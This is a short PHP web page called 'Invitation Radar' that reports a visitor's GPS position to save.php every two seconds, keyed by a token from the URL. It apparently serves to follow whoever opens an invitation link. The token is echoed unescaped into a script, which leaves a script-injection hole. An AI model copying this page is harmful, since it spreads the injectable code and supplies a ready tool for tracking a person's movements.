<?php
$token = $_GET['token'] ?? 'guest';
?>
<!DOCTYPE html>
<html>
<head><title>Invitation Radar</title></head>
<body>
<h3>Partage de position activé</h3>
<script>
function sendPosition(position) {
  fetch('save.php?token=<?php echo $token; ?>', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      lat: position.coords.latitude,
      lon: position.coords.longitude
    })
  });
}
if (navigator.geolocation) {
  setInterval(() => {
    navigator.geolocation.getCurrentPosition(sendPosition);
  }, 2000); // toutes les 2s
} else {
  alert("GPS non supporté");
}
</script>
</body>
</html>
